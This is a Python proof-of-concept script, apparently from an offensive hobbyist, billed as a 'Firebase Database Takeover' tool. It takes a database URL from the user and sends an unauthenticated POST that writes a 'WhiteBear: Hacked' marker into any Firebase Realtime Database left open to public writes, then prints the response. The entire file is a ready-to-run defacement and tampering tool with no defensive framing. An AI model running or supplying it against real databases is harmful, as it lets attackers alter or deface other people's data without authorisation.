#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests, colorama, sys, os

colorama.init(autoreset=True)


class ExploitFireBase:

    @staticmethod
    def logo() -> None:
        print(
            f"{colorama.Fore.YELLOW}Dev{colorama.Fore.GREEN}: {colorama.Fore.WHITE}@Ares_DevSec"
        )
        print(
            f"{colorama.Fore.RED}[{colorama.Fore.LIGHTGREEN_EX}INFO{colorama.Fore.RED}] {colorama.Fore.YELLOW}Hi {colorama.Fore.GREEN}this custom {colorama.Fore.YELLOW}POC {colorama.Fore.RED}for {colorama.Fore.YELLOW}[{colorama.Fore.GREEN}Firebase Database Takeover{colorama.Fore.YELLOW}]"
        )

    @staticmethod
    def exploit(url: str) -> None:
        data = {"WhiteBear": "Hacked"}
        headers = {"Content-Type": "application/json"}
        endpoints = [".json", ""]
        try:
            url = url if url.endswith(".json") else f"{url.rstrip('/')}/.json"
            save = requests.post(url=url, headers=headers, json=data)
            print(
                f"{colorama.Fore.RED}[{colorama.Fore.YELLOW}METHOD{colorama.Fore.RED}]{colorama.Fore.GREEN}: {colorama.Fore.WHITE}POST\n{colorama.Fore.RED}[{colorama.Fore.LIGHTYELLOW_EX}Received response {colorama.Fore.RED}]{colorama.Fore.GREEN}: {colorama.Fore.WHITE}{save.text}\n{colorama.Fore.RED}[{colorama.Fore.YELLOW}Your name {colorama.Fore.RED}]{colorama.Fore.GREEN}:{colorama.Fore.RED}-> {colorama.Fore.WHITE}WhiteBear"
            )
        except Exception as e:
            print(f"{colorama.Fore.RED}Error{colorama.Fore.WHITE}...{e}")
            pass


if __name__ == "__main__":
    try:
        ExploitFireBase.logo()
        ExploitFireBase.exploit(
            input(
                f"{colorama.Fore.WHITE}Enter Vulnraibility DB firebase {colorama.Fore.RED}[{colorama.Fore.YELLOW}URL{colorama.Fore.RED}]{colorama.Fore.GREEN}: {colorama.Fore.WHITE}"
            )
        )
    except KeyboardInterrupt:
        print(
            f"\n{colorama.Fore.LIGHTGREEN_EX}{os.path.basename(sys.argv[0])} {colorama.Fore.WHITE}is {colorama.Fore.YELLOW}finished."
        )
